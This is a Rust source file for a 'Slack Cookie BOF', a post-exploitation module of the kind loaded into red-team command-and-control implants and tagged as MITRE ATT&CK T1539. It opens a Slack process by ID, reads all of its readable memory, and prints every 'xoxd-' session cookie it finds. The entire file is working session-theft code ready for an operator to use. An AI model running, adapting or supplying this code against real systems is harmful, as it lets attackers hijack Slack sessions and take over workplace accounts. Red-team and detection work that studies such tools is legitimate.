//! # Slack Cookie BOF
//!
//! Scans a Slack process's memory for authentication cookies by searching for
//! the "xoxd-" cookie token pattern. Enumerates committed readable memory
//! regions using VirtualQueryEx and reads each with ReadProcessMemory.
//! ## MITRE ATT&CK
//! - T1539 - Steal Web Session Cookie
//!
//! ## Arguments
//! - `int`: Target Slack process ID.

#![no_std]

use alloc::vec;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, FALSE, GetLastError};
use windows_sys::Win32::System::Threading::{
    OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
};

#[repr(C)]
struct MemoryBasicInformation {
    base_address: usize,
    allocation_base: usize,
    allocation_protect: u32,
    partition_id: u16,
    _pad: [u8; 6],
    region_size: usize,
    state: u32,
    protect: u32,
    type_: u32,
}

const MEM_COMMIT: u32 = 0x1000;
const PAGE_NOACCESS: u32 = 0x01;
const PAGE_GUARD: u32 = 0x100;

unsafe extern "system" {
    fn VirtualQueryEx(
        process: *mut core::ffi::c_void,
        address: *const core::ffi::c_void,
        buffer: *mut MemoryBasicInformation,
        length: usize,
    ) -> usize;

    fn ReadProcessMemory(
        process: *mut core::ffi::c_void,
        base_address: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        bytes_read: *mut usize,
    ) -> i32;
}

const COOKIE_PREFIX: &[u8] = b"xoxd-";

const MAX_REGION_SIZE: usize = 4 * 1024 * 1024;

fn find_pattern(buf: &[u8], pattern: &[u8], base: usize) -> usize {
    let mut count = 0usize;
    if buf.len() < pattern.len() {
        return 0;
    }
    let mut i = 0;
    while i <= buf.len() - pattern.len() {
        if &buf[i..i + pattern.len()] == pattern {
            let start = i;
            let mut end = i + pattern.len();
            while end < buf.len() && buf[end] >= 0x21 && buf[end] < 0x7f {
                end += 1;
            }
            let cookie_len = end - start;
            if cookie_len > pattern.len() {
                if let Ok(s) = core::str::from_utf8(&buf[start..core::cmp::min(end, start + 128)]) {
                    println!("  [0x{:X}] {} ({} bytes)", base + start, s, cookie_len);
                    count += 1;
                }
            }
            i = end;
        } else {
            i += 1;
        }
    }
    count
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let pid = parser.get_int() as u32;

    if pid == 0 {
        eprintln!("Invalid PID");
        return;
    }

    println!(
        "slack_cookie: Scanning process {} for Slack auth cookies (xoxd- prefix)",
        pid
    );

    let process = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid) };
    if process.is_null() {
        let err = unsafe { GetLastError() };
        eprintln!("Failed to open process {} (error {:#X})", pid, err);
        return;
    }

    let mut address: usize = 0;
    let mut total_found: usize = 0;
    let mut regions_scanned: u32 = 0;
    let mbi_size = core::mem::size_of::<MemoryBasicInformation>();

    loop {
        let mut mbi: MemoryBasicInformation = unsafe { core::mem::zeroed() };
        let ret = unsafe {
            VirtualQueryEx(
                process,
                address as *const core::ffi::c_void,
                &mut mbi,
                mbi_size,
            )
        };

        if ret == 0 {
            break;
        }

        if mbi.state == MEM_COMMIT
            && (mbi.protect & PAGE_NOACCESS) == 0
            && (mbi.protect & PAGE_GUARD) == 0
        {
            let size = core::cmp::min(mbi.region_size, MAX_REGION_SIZE);
            let mut buf = vec![0u8; size];
            let mut bytes_read: usize = 0;

            let ok = unsafe {
                ReadProcessMemory(
                    process,
                    mbi.base_address as *const core::ffi::c_void,
                    buf.as_mut_ptr() as *mut core::ffi::c_void,
                    size,
                    &mut bytes_read,
                )
            };

            if ok != 0 && bytes_read > 0 {
                let found = find_pattern(&buf[..bytes_read], COOKIE_PREFIX, mbi.base_address);
                total_found += found;
                regions_scanned += 1;
            }
        }

        address = mbi.base_address + mbi.region_size;
        if address <= mbi.base_address {
            break;
        }
    }

    unsafe { CloseHandle(process) };

    println!(
        "Scanned {} regions, found {} Slack cookie(s)",
        regions_scanned, total_found
    );
    if total_found > 0 {
        println!("SUCCESS.");
    } else {
        println!("No Slack cookies found in process memory.");
    }
}
